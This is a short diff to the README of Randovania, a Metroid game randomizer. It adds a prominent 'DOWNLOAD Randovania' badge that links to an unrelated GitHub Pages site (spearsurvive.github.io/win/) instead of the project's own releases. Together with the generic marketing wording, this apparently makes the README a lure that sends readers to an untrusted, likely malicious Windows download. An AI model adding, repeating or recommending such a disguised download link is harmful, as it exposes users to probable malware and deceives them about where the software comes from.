@@ -30,6 +30,12 @@ Randovania generates randomized item seeds for Metroid Prime, Metroid Dread, Met
 
 Whether you're a newcomer or a veteran, Randovania provides the tools you need to get the most out of your gaming mods experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Randovania](https://img.shields.io/badge/⬇_DOWNLOAD_Randovania-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
